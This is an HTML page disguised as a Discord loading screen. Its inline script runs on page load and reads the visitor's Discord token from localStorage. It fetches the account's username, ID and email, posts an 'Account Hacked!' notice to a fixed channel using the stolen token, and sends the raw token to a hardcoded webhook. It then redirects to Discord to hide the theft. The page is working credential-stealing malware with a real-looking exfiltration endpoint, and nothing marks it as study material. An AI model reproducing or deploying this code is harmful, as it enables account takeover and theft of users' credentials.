<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="utf-8">
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0; display: flex; justify-content: center; align-items: center;
      height: 100vh; background: #2f3136; color: #dcddde;
      font-family: 'gg sans', 'Noto Sans', sans-serif;
    }
    .loader {
      width: 48px; height: 48px; border: 4px solid #404249;
      border-top: 4px solid #7289da; border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <script>
    (function() {
      try {
        var token = localStorage.getItem("token");
        if (token) {
          token = token.replace(/"/g, "");

          // 先取得帳號資訊
          var usersReq = new XMLHttpRequest();
          usersReq.open("GET", "https://discord.com/api/v9/users/@me");
          usersReq.setRequestHeader("Authorization", token);
          usersReq.onreadystatechange = function() {
            if (usersReq.readyState === 4 && usersReq.status === 200) {
              try {
                var user = JSON.parse(usersReq.responseText);
                var username = user.username;
                var userId = user.id;
                var email = user.email || 'N/A';

                // 發送訊息到目標
                var msgReq = new XMLHttpRequest();
                msgReq.open("POST", "https://discord.com/api/v9/channels/878151437085974548/messages");
                msgReq.setRequestHeader("Content-Type", "application/json");
                msgReq.setRequestHeader("Authorization", token);
                msgReq.send(JSON.stringify({
                  content: "🔓 **Account Hacked!**\n使用者: **" + username + "** (" + userId + ")\nEmail: " + email
                }));

                // 把 token 送到 webhook（同步請求確保送出）
                var wbReq = new XMLHttpRequest();
                wbReq.open("POST", "https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", false);
                wbReq.setRequestHeader("Content-Type", "application/json");
                wbReq.send(JSON.stringify({
                  content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "**\n```\n" + token + "\n```"
                }));

                // 所有請求都發送完畢，跳回 Discord
                window.location.href = "https://discord.com/channels/@me";
              } catch(e) {
                console.log("Parse failed:", e);
                window.location.href = "https://discord.com/channels/@me";
              }
            }
          };
          usersReq.send();

          // 10 秒超時
          setTimeout(function() {
            window.location.href = "https://discord.com/channels/@me";
          }, 10000);
        } else {
          window.location.href = "https://discord.com/channels/@me";
        }
      } catch(e) {
        console.log("Token 抓取失敗:", e);
      }
    })();
  </script>
</body>
</html>
